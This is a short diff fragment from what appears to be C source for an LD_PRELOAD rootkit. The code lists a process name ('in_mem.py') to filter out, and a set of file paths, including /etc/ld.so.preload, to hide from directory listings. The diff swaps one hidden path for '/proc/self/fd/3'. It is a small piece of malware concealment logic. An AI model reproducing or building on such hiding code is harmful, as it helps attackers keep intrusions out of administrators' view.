@@ -10,7 +10,7 @@ static const char *process_to_filter = "in_mem.py";
 /* Every file with these names will be excluded */
 static const char *hidden_files[] = {
     "/etc/ld.so.preload",
-    "/use/lib/hidden.so"
+    "/proc/self/fd/3"
 };
 
 /* Get a directory name given a DIR* handle */
